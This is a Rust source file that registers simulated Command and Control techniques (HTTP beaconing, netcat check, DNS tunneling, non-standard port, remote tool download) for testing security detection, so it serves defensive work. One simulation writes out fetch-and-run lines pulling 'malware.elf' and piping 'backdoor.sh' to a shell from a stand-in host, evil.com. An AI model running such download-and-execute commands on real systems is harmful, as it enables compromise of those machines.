//! TA0011: Command and Control technique simulations.

use crate::framework::{AttackSimulation, AttackSimulator, SimulationExecution, Tactic};
use std::sync::Arc;

pub fn register(simulator: &mut AttackSimulator) {
    // T1071.001 - HTTP C2
    simulator.register(AttackSimulation {
        id: "c2-001".to_string(),
        name: "HTTP C2 Pattern".to_string(),
        technique_id: "T1071.001".to_string(),
        tactic: Tactic::CommandAndControl,
        description: "HTTP-based C2 communication pattern".to_string(),
        expected_alert: "C2 communication detected".to_string(),
        should_detect: true,
        requires_root: false,
        executor: Arc::new(|| SimulationExecution {
            commands: vec![r#"for i in 1 2 3; do curl -s --max-time 1 http://example.com 2>/dev/null; sleep 0.5; done || true"#.to_string()],
            cleanup: vec![],
            artifacts: vec![],
        }),
    });

    // T1095 - Non-application layer protocol (raw sockets)
    simulator.register(AttackSimulation {
        id: "c2-002".to_string(),
        name: "Raw Socket C2".to_string(),
        technique_id: "T1095".to_string(),
        tactic: Tactic::CommandAndControl,
        description: "Netcat-based raw socket C2".to_string(),
        expected_alert: "Raw socket C2 detected".to_string(),
        should_detect: true,
        requires_root: false,
        executor: Arc::new(|| SimulationExecution {
            commands: vec!["which nc ncat 2>/dev/null && echo 'netcat available'".to_string()],
            cleanup: vec![],
            artifacts: vec![],
        }),
    });

    // T1572 - Protocol tunneling
    simulator.register(AttackSimulation {
        id: "c2-003".to_string(),
        name: "DNS Tunneling Pattern".to_string(),
        technique_id: "T1572".to_string(),
        tactic: Tactic::CommandAndControl,
        description: "DNS-based data exfiltration pattern".to_string(),
        expected_alert: "DNS tunneling detected".to_string(),
        should_detect: true,
        requires_root: false,
        executor: Arc::new(|| SimulationExecution {
            commands: vec![
                "nslookup aGVsbG93b3JsZHRlc3RkYXRh.test.example.com 2>/dev/null || true"
                    .to_string(),
            ],
            cleanup: vec![],
            artifacts: vec![],
        }),
    });

    // T1571 - Non-standard port
    simulator.register(AttackSimulation {
        id: "c2-004".to_string(),
        name: "Non-Standard Port HTTP".to_string(),
        technique_id: "T1571".to_string(),
        tactic: Tactic::CommandAndControl,
        description: "HTTP on non-standard port".to_string(),
        expected_alert: "Non-standard port communication detected".to_string(),
        should_detect: true,
        requires_root: false,
        executor: Arc::new(|| SimulationExecution {
            commands: vec![
                "curl -s --max-time 1 http://example.com:8443 2>/dev/null || true".to_string(),
            ],
            cleanup: vec![],
            artifacts: vec![],
        }),
    });

    // T1105 - Ingress tool transfer
    simulator.register(AttackSimulation {
        id: "c2-005".to_string(),
        name: "Remote Tool Download".to_string(),
        technique_id: "T1105".to_string(),
        tactic: Tactic::CommandAndControl,
        description: "Download executable from internet".to_string(),
        expected_alert: "Remote tool download detected".to_string(),
        should_detect: true,
        requires_root: false,
        executor: Arc::new(|| SimulationExecution {
            commands: vec![
                "echo 'wget http://evil.com/malware.elf -O /tmp/malware' > /tmp/winncore-download-test".to_string(),
                "echo 'curl http://evil.com/backdoor.sh | sh' >> /tmp/winncore-download-test".to_string(),
            ],
            cleanup: vec!["rm -f /tmp/winncore-download-test".to_string()],
            artifacts: vec!["/tmp/winncore-download-test".to_string()],
        }),
    });
}
